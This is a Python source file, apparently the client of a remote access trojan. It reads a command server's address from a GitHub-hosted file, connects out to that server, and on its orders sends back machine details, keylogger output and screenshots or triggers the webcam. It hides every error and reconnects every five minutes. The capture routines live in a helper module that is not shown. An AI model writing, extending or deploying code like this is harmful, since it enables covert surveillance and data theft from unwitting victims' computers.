import lib_cliente, socket, requests, os, time

cliente = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

while True:
    try:
        url = "https://raw.githubusercontent.com/PauloDoMonte/Zhitkur/main/ip.txt"
        r = requests.get(url,allow_redirects=True)
        open('url.txt','wb').write(r.content)
        arquivo = open('url.txt','r')
        url = arquivo.readline()
        r0 = str(url)
        r1 = r0.split(",")
        Ip = r1[0]
        Porta = int(r1[1])
        os.remove('url.txt')
        cliente.connect((Ip,Porta))

        while True:
            mensagem = cliente.recv(2048)
            mensagem_decode = mensagem.decode()

            if(mensagem_decode.upper() == "DETALHES DA MAQUINA"):
                lib_cliente.detalhes_da_maquina(cliente)

            elif(mensagem_decode.upper() == "DETALHES DO PYTHON"):
                lib_cliente.detalhes_do_python(cliente)

            elif(mensagem_decode.upper() == "KEYLOGGER"):
                lib_cliente.keylogger(cliente)

            elif(mensagem_decode.upper() == "SCREENSHOT"):
                lib_cliente.screenshot(cliente)

            elif(mensagem_decode.upper() == "WEBCAM"):
                lib_cliente.webcam()

            else:
                lib_cliente.comando_nao_reconhecido(cliente)
    except:
        time.sleep(60*5)
